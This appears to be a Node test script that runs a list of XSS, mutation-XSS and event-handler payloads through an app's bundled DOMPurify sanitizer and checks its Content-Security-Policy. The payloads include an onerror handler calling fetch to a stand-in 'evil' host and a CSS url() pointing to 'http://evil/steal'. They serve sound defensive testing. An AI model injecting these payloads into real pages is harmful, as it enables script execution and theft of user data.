// XSS / content-injection checks against the sanitizer the app actually ships
// (app.jsx config + hook, bundled lib/purify.min.js).
const fs = require("fs");
const path = require("path");
const { loadAppSanitizer, findProblems, root } = require("./helpers/sanitizer");

const { sanitizeHTML, window, version } = loadAppSanitizer();

let pass = 0, fail = 0;
function t(name, ok, detail) {
  if (ok) { console.log(`  ✓ ${name}`); pass++; }
  else { console.log(`  ✗ ${name}${detail ? " → " + detail : ""}`); fail++; }
}

console.log(`\n(bundled DOMPurify ${version})`);

console.log("\n=== XSS ATTACK VECTORS ===");
const vectors = [
  ['<script>alert(1)</script>', "script"],
  ['<img src=x onerror="alert(1)">', "onerror"],
  ['<svg onload=alert(1)>', "svg onload"],
  ['<a href="javascript:alert(1)">x</a>', "javascript: href"],
  ['<a href="  JaVaScRiPt:alert(1)">x</a>', "javascript: href, mixed case + spaces"],
  ['<iframe src="http://evil"></iframe>', "iframe"],
  ['<object data="evil.swf"></object>', "object"],
  ['<embed src="evil">', "embed"],
  ['<form action="http://evil"><input type=password></form>', "form + password input"],
  ['<meta http-equiv="refresh" content="0;evil">', "meta refresh"],
  ['<link rel=stylesheet href="http://evil/x.css">', "link stylesheet"],
  ['<base href="http://evil/">', "base"],
  ['<a href="vbscript:alert(1)">x</a>', "vbscript: href"],
  ['<div onmouseover="alert(1)">x</div>', "onmouseover"],
  ['<input type="password" name=pw>', "password input"],
  ['<img src="x" onerror="fetch(\'//evil\')">', "fetch exfil"],
  ['<a href="data:text/html,<script>alert(1)</script>">x</a>', "data:text/html href"],
  ['<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>', "mXSS noscript"],
  ['<svg><style><img src=x onerror=alert(1)></style></svg>', "mXSS style in svg"],
  ['<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', "mXSS math/mglyph"],
  ['<button formaction="javascript:alert(1)">x</button>', "button formaction"],
  ['<textarea><img src=x onerror=alert(1)></textarea>', "textarea"],
  ['<template><img src=x onerror=alert(1)></template>', "template"],
];
for (const [payload, label] of vectors) {
  const problems = findProblems(window, sanitizeHTML(payload));
  t(`Blocks ${label}`, problems.length === 0, problems.join(", "));
}

console.log("\n=== EVENT HANDLERS (all on* attributes) ===");
const handlers = ["onabort", "onauxclick", "onbeforeinput", "oncopy", "oncut", "ondrag", "ondrop",
  "onformdata", "oninput", "oninvalid", "onpaste", "onreset", "onsearch", "onselect",
  "onselectionchange", "onselectstart", "onslotchange", "ontoggle", "onwheel", "onfocusin",
  "onanimationstart", "ontransitionend", "onpointerenter", "oncontentvisibilityautostatechange"];
for (const attr of handlers) {
  const clean = sanitizeHTML(`<div ${attr}="alert(1)">x</div>`);
  t(`${attr} stripped`, !clean.toLowerCase().includes(attr), clean);
}

console.log("\n=== LEGITIMATE CONTENT ===");
const legit = [
  ['<p>Hello <strong>world</strong></p>', "basic formatting", c => c === '<p>Hello <strong>world</strong></p>'],
  ['<h1>Title</h1><h2>Sub</h2>', "headings", c => c === '<h1>Title</h1><h2>Sub</h2>'],
  ['<ul><li>item</li></ul>', "lists", c => c === '<ul><li>item</li></ul>'],
  ['<table><tbody><tr><td>cell</td></tr></tbody></table>', "tables", c => c.includes("<td>cell</td>")],
  ['<pre><code>const x = 1;</code></pre>', "code", c => c === '<pre><code>const x = 1;</code></pre>'],
  ['<a href="https://example.com" target="_blank">link</a>', "https link", c => c.includes('href="https://example.com"')],
  ['<img src="data:image/png;base64,iVBORw0KGgo=" alt="t">', "pasted data: image", c => c.includes('src="data:image/png;base64,iVBORw0KGgo="')],
  ['<div class="nf-check"><input type="checkbox" id="t1"><label for="t1">Do it</label></div>', "checklist",
    c => c.includes('type="checkbox"') && c.includes('<label for="t1">Do it</label>')],
  ['<blockquote>quote</blockquote>', "blockquote", c => c === '<blockquote>quote</blockquote>'],
  ['<font color="#dc2626" size="5">red</font>', "font color/size (execCommand output)", c => c.includes('color="#dc2626"') && c.includes('size="5"')],
  ['<span style="background-color: rgb(254, 240, 138);">hl</span>', "highlight style", c => c.includes("background-color")],
];
for (const [html, label, ok] of legit) {
  const clean = sanitizeHTML(html);
  t(`Preserves ${label}`, ok(clean), clean);
}

console.log("\n=== Images can't load from the network or a UNC path ===");
// On file:// a protocol-relative URL resolves to file://host/..., which Windows opens over SMB.
const srcs = ["//127.0.0.1/share/x.png", "\\\\127.0.0.1\\share\\x.png", "file://127.0.0.1/share/x.png",
  "file:///C:/Windows/win.ini", "http://example.com/x.png", "https://example.com/x.png", "x.png", " DATA:text/html,x"];
for (const src of srcs) {
  const clean = sanitizeHTML(`<img src="${src}" alt="a">`);
  t(`img src "${src}" removed`, !/src=/i.test(clean), clean);
}
t("img data:image/jpeg kept", /src="data:image\/jpeg;base64,AAAA"/.test(sanitizeHTML('<img src="data:image/jpeg;base64,AAAA">')));

console.log("\n=== CSS url() relies on CSP ===");
// DOMPurify does not parse CSS, so url() inside a style attribute survives. The CSP
// img-src directive is what stops it from loading anything.
const styled = sanitizeHTML('<div style="background:url(http://evil/steal)">x</div>');
t("style url() survives DOMPurify (documented; CSP must block it)", /url\(/.test(styled));
const csp = (fs.readFileSync(path.join(root, "index.html"), "utf-8").match(/Content-Security-Policy" content="([^"]+)"/) || [])[1] || "";
t("CSP present", csp.length > 0);
// 'self' is not safe here: on a file:// page Chromium matches it against any file: URL,
// including file://host/share (UNC).
t("CSP img-src is data: only", (csp.match(/img-src([^;]*)/) || [])[1]?.trim() === "data:", csp);

console.log("\n=== Summary ===");
console.log(`  ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
